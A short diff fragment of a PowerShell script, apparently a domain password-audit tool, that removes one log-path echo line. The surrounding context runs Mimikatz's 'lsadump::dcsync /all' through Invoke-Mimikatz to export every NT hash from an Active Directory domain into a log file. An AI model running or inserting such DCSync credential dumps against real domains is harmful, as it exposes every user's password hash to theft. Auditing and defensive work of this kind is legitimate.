@@ -77,7 +77,6 @@ if ($confirmation -eq 'y') {
     
     # execute DCSync to export NT-Hashes
     Write-Host "[!] Exporting NT-Hashes via DCSync - this may take a while..." -ForegroundColor Yellow
-    Write-Host "    >" $LOGFILE -ForegroundColor Gray
     $command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
     Invoke-Mimikatz -Command $command | Out-Null
 
